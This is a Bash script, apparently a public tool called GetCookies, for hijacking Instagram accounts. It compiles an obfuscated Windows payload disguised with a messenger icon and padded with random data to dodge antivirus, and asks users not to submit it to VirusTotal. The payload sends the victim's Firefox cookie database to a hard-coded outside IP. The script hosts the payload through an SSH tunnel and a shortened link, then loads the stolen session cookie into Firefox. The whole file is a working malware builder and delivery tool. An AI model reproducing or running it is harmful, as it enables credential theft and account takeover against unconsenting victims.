#!/bin/bash
# GetCookies v1.0
# Coded by @linux_choice (Don't change! Read the License!)
# Github: https://github.com/thelinuxchoice/getcookies

host="159.89.214.31" #Serveo.net (Port Forwarding Tunneling)

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;77m   ____      _    ____            _    _            \n"
printf "  / ___| ___| |_ / ___|___   ___ | | _(_) ___  ___  \n"
printf " | |  _ / _ \ __| |   / _ \ / _ \| |/ / |/ _ \/ __| \n"
printf " | |_| |  __/ |_| |__| (_) | (_) |   <| |  __/\__ \ \n"
printf "  \____|\___|\__|\____\___/ \___/|_|\_\_|\___||___/\e[0m \n"
                                                                                             
printf "\n"
printf "\e[1;77m            .:.:\e[0m\e[1;93m Cookies Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
printf "\e[1;93m         .:.:\e[0m\e[1;92m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
printf "\n"
printf "     \e[101m::  Warning: Attacking targets without  ::\e[0m\n"
printf "     \e[101m::  prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"

}


stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
command -v sqlite3 > /dev/null 2>&1 || { echo >&2 "I require sqlite3 but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"apt-get install mingw-w64 or bash install.sh\" .Aborting."; 
exit 1; }
command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
exit 1; }

}

infoinsta() {



#curl -b insta_cookies.txt  -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -L https://i.instagram.com/api/v1/news/inbox/?

firefox -CreateProfile getcookies
cp uploadedfiles/cookies.sqlite ~/.mozilla/firefox/*.getcookies
firefox -P getcookies https://www.instagram.com/

exit 1

}

manage_cookie() {

cookie=$(echo "select * from moz_cookies;" | sqlite3 uploadedfiles/cookies.sqlite | grep -o 'sessionid|.*|' | cut -d '|' -f2)

if [[ $cookie == "" ]]; then
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Not found!\e[0m\n"
exit 1
else

printf "#HttpOnly_.instagram.com	TRUE	/	TRUE	9999999999	sessionid	%s\n" $cookie > insta_cookies.txt
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Instagram Cookies Found! (Saved: insta_cookies.txt)\e[0m\n"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Open Firefox?\e[0m\e[1;92m [Y/n]: \e[0m' instainfo

if [[ $instainfo == "Y" || $instainfo == "Yes" || $instainfo == "y" || $instainfo == "yes" ]]; then
infoinsta
else
exit 1
fi
fi
}

wait_cookie() {

while [ true ]; do
if [[ -e Log.log ]]; then
printf "\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Cookies Received! [Saved: uploadedfiles/cookies.sqlite\e[0m\n"
cat Log.log >> log.backup
rm -rf Log.log
manage_cookie
fi
sleep 0.5
done


}

server() {

if [[ ! -d uploadedfiles ]]; then
mkdir uploadedfiles/
fi
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"


$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net -R '$default_port3':localhost:'$default_port2'  2> /dev/null > sendlink ' &

sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.exe \n' $send_link $payload_name
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server1...\e[0m\n"
php -S localhost:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server2...\e[0m\n"
php -S localhost:$default_port2  > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting cookies file...\e[0m\n'
wait_cookie
printf "\n"



}

compile() {

if [[ ! -e program.c ]]; then
printf "\e[1;93m[!] Error...\e[0m\n"
exit 1
else
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling... \e[0m\n"
i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-gcc program.c my.res -o $payload_name.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
rm -rf program.c
rm -rf icon.rc
rm -rf my.res
fi

}

icon() {

default_payload_icon="icon/messenger.ico"
printf '\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
read payload_icon
payload_icon="${payload_icon:-${default_payload_icon}}"

if [[ ! -e $payload_icon ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
icon
else
if [[ $payload_icon != *.ico ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
icon
fi
fi

}

start() {
rm -rf Log.log
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
icon
payload
compile
server



}

#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> program.cpp
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> program.c
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> program.c
		else
			echo $randomString >> program.c
		fi
	done
        let counter=counter+1
    done
}

payload() {


printf "#include <stdio.h>\n" > program.c
printf "#include <winsock2.h>\n" >> program.c
printf "#include <windows.h>\n" >> program.c
printf "#include <string.h>\n" >> program.c
printf "#include <curl/curl.h>\n" >> program.c
generatePadding
generatePadding
cat part1 >> program.c
generatePadding
generatePadding
cat part3 >> program.c
printf "    curl_easy_setopt(curl, CURLOPT_URL, \"http://%s:%s/receive.php\");\n" $host $default_port3 >> program.c
cat part2 >> program.c
generatePadding >> program.c
generatePadding >> program.c
printf "id ICON \"%s\"" $payload_icon  > icon.rc

}

banner
dependencies
start
